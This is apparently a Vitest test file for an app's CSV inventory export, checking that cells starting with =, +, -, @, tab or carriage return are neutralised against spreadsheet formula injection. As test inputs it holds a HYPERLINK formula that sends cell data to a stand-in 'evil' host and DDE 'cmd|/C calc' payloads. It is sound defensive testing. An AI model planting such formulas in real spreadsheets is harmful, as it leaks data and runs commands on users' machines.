import { describe, it, expect } from 'vitest';
import { csvCell, buildInventoryCsv, type SnapshotFlowRow } from '@/lib/run-snapshot';

// EXP-3 / security L5: a step or substance named =HYPERLINK(...) ran as a
// formula when the inventory CSV was opened in Excel.
describe('csvCell', () => {
  it.each([
    ['=HYPERLINK("http://evil/?"&A1,"x")', `"'=HYPERLINK(""http://evil/?""&A1,""x"")"`],
    ['+SUM(A1:A2)', "'+SUM(A1:A2)"],
    ['-2+3+cmd|/C calc!A0', "'-2+3+cmd|/C calc!A0"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['\tTabbed', "'\tTabbed"],
    ['\rCarriage', `"'\rCarriage"`],
  ])('neutralises formula text %j', (input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  it('leaves real numbers alone, negative and scientific included', () => {
    expect(csvCell(-12.5)).toBe('-12.5');
    expect(csvCell(4.2e-7)).toBe('4.2e-7');
    expect(csvCell('-12.5')).toBe('-12.5');
    expect(csvCell(0)).toBe('0');
  });

  it('quotes commas, quotes, line feeds and carriage returns', () => {
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
    expect(csvCell('line1\rline2')).toBe('"line1\rline2"');
  });

  it('prints null and undefined as empty', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });
});

const row = (over: Partial<SnapshotFlowRow>): SnapshotFlowRow => ({
  flow_id: 1,
  component_id: 2,
  component: 'Assembly',
  substance: 'Aluminum',
  category_name: 'Global Warming',
  dir: 'IN',
  amount: 2.2,
  unit: 'kg',
  factor: 8.6,
  scope: 'Global',
  conversion: null,
  impact: 18.92,
  ...over,
});

describe('buildInventoryCsv', () => {
  const base = {
    runId: 7,
    projectName: 'Bike',
    caseName: 'Base',
    method: 'TRACI 2.1',
    region: 'US',
    functionalUnit: '1 bicycle',
    exportedAt: '2026-09-29T00:00:00.000Z',
    stageFor: (r: SnapshotFlowRow) => (r.component_id === 3 ? 'end_of_life' : 'materials'),
    unitFor: (c: string) => (c === 'Global Warming' ? 'kg CO2 eq' : 'kg CFC-11 eq'),
  };

  it('adds an impact_unit column right after impact_value', () => {
    const csv = buildInventoryCsv({ ...base, rows: [row({}), row({ category_name: 'Ozone Depletion', impact: 4.2e-7 })] });
    const lines = csv.split('\n');
    const header = lines.find((l) => l.startsWith('step,'))!.split(',');
    expect(header.slice(-2)).toEqual(['impact_value', 'impact_unit']);
    expect(lines.at(-2)!.endsWith(',18.92,kg CO2 eq')).toBe(true);
    expect(lines.at(-1)!.endsWith(',4.2e-7,kg CFC-11 eq')).toBe(true);
  });

  it('looks the stage up per step id, so two steps named alike keep their own stage', () => {
    const csv = buildInventoryCsv({
      ...base,
      rows: [row({ component_id: 2 }), row({ component_id: 3, flow_id: 2, impact: -4.3 })],
    });
    const data = csv.split('\n').filter((l) => l.startsWith('Assembly,'));
    expect(data[0].split(',')[1]).toBe('materials');
    expect(data[1].split(',')[1]).toBe('end_of_life');
  });

  it('neutralises formula names in data rows', () => {
    const csv = buildInventoryCsv({ ...base, rows: [row({ component: '=cmd|"/C calc"!A0', substance: '@evil' })] });
    const last = csv.split('\n').at(-1)!;
    expect(last.startsWith(`"'=cmd|""/C calc""!A0",materials,'@evil,`)).toBe(true);
  });

  it('keeps each # header line one line and one cell, whatever the names contain', () => {
    const csv = buildInventoryCsv({
      ...base,
      projectName: 'Evil\r\n=HYPERLINK("http://x"),y',
      caseName: 'Case, with comma',
      rows: [row({})],
    });
    const lines = csv.split('\n');
    const headerEnd = lines.findIndex((l) => l.startsWith('step,'));
    const headerLines = lines.slice(0, headerEnd);
    expect(headerLines).toHaveLength(6);
    for (const l of headerLines) {
      expect(l.startsWith('# ') || l.startsWith('"# ')).toBe(true);
      expect(l).not.toMatch(/\r/);
    }
    expect(headerLines[1]).toBe('"# Project: Evil =HYPERLINK(""http://x""),y"');
    expect(headerLines[2]).toBe('"# Case: Case, with comma"');
  });

  it('says so when a legacy run has no flow detail', () => {
    const csv = buildInventoryCsv({ ...base, rows: [] });
    expect(csv).toMatch(/made before flow-level detail was recorded/);
  });

  it('prints the legacy note as a header line when given', () => {
    const csv = buildInventoryCsv({ ...base, rows: [row({})], note: 'Stages recomputed from current data' });
    expect(csv.split('\n')).toContain('# Stages recomputed from current data');
  });
});
